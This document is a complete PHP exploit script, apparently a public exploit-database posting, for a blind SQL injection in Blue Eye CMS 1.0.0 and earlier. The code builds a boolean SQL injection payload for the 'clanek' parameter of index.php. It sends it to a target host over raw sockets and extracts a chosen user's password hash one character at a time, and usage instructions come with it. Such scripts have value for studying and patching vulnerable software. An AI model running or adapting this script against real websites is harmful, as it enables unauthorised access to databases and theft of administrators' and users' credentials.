--+++===============================================================+++--
--+++====== Blue Eye CMS <= 1.0.0 Blind SQL Injection Exploit ======+++--
--+++===============================================================+++--


<?php

function usage ()
{
	echo
		"\n[+] Blue Eye CMS <= 1.0.0 Blind SQL Injection Exploit".
		"\n[+] http://kent.dl.sourceforge.net/sourceforge/blueeyecms/blue_eye_cms-1_0_0_preRC.rar".
		"\n[+] Author: darkjoker".
		"\n[+] Site  : http://darkjoker.net23.net".
		"\n[+] Usage : php xpl.php <hostname> <path> <username>".
		"\n[+] Ex.   : php xpl.php localhost /BlueEye admin".
		"\n\n";
	exit ();
}

function query ($user, $pos, $chr)
{
	$query = "x' OR ASCII(SUBSTRING((SELECT password FROM blueeye_users WHERE user = '{$user}'),{$pos},1))={$chr} OR '1' = '2";
	$query = str_replace (" ", "%20", $query);
	$query = str_replace ("'", "%27", $query);
	return $query;
}

function decrypt ($hash)
{
	$sha1 = unpack ("H*", base64_decode ($hash));
	return $sha1 [1];
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$fp = fsockopen ($hostname, 80);
	$chr = ord ($chr);
	$query = query ($user, $pos, $chr);

	$get = 
		"GET {$path}/index.php?clanek={$query} HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n\r\n";
	fputs ($fp, $get);

	while (!feof ($fp))
		$reply .= fgets ($fp, 1024);
	
	fclose ($fp);

	preg_match ("/Autor: (.+?)<br>/", $reply, $x);
	if (empty ($x [1]))
		return false;
	else
		return true;
}

if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
$pos = 1;
$chr = 0;
echo "\n[+] Finding password: ";
while ($chr < strlen  ($key))
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		$pass .= $key [$chr];
		echo $key [$chr];
		$chr = -1;
		$pos++;
	}
	$chr++;
}
echo "\n[+] sha1 Hash: ";
echo decrypt ($pass) . "\n\n";

?>
